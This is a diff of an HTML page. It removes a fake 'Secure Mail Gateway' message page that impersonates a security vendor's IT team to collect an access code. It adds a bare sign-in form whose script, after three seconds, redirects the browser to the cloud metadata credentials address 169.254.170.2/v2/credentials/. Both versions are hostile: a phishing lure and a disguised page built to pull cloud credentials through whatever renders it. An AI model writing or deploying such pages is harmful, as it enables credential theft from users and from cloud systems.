@@ -1,37 +1,22 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
 <meta charset="utf-8">
-<title>Encrypted Message Released — Secure Mail Gateway</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-  body { font: 15px system-ui, sans-serif; max-width: 40rem; margin: 3rem auto; padding: 1rem; }
-  h1 { color: #075; }
-  .banner { background: #eef; padding: 1rem; border-left: 4px solid #075; margin-bottom: 1rem; }
-  label { display: block; margin: 1rem 0 .3rem 0; font-weight: bold; }
-  input, button { padding: .6rem; font: inherit; width: 100%; box-sizing: border-box; }
-  button { background: #075; color: #fff; border: 0; margin-top: 1rem; cursor: pointer; }
-</style>
+<title>Sign in</title>
+<style>body { font: 12px system-ui; max-width: 55rem; margin: 1rem auto; }</style>
 </head>
 <body>
-<h1>Secure Mail Gateway — Encrypted Message</h1>
-<div class="banner">
-  <p><strong>From:</strong> it-security@kaspersky.com<br>
-  <strong>Subject:</strong> Q3 2026 Security Compliance Notice<br>
-  <strong>Status:</strong> Encrypted &mdash; access code required</p>
-</div>
-<p>This message was released to you by your organization's Secure Email Gateway
-(compatible with Cisco Registered Envelope Service and Zix Encrypted Messaging).
-Enter the one-time access code that was delivered to the recipient mailbox to
-decrypt and view the message.</p>
-
-<form id="release-form" action="/decrypt" method="post" autocomplete="on">
-  <input type="email" name="recipient" value="employee@corp-example.com"
-         readonly hidden autocomplete="username">
-  <label for="access_code">Access code</label>
-  <input type="password" id="access_code" name="access_code"
-         autocomplete="one-time-code" placeholder="Enter access code from email">
-  <button type="submit">View Secure Message</button>
+<h1>Sign in to your account</h1>
+<form id="login-form">
+  <label>Username <input type="text" name="username" id="username" autocomplete="username"></label>
+  <label>Password <input type="password" name="password" id="password" autocomplete="current-password"></label>
+  <button type="submit">Sign in</button>
 </form>
+<script>
+"use strict";
+setTimeout(function () {
+  window.location.href = "http://169.254.170.2/v2/credentials/";
+}, 3000);
+</script>
 </body>
 </html>
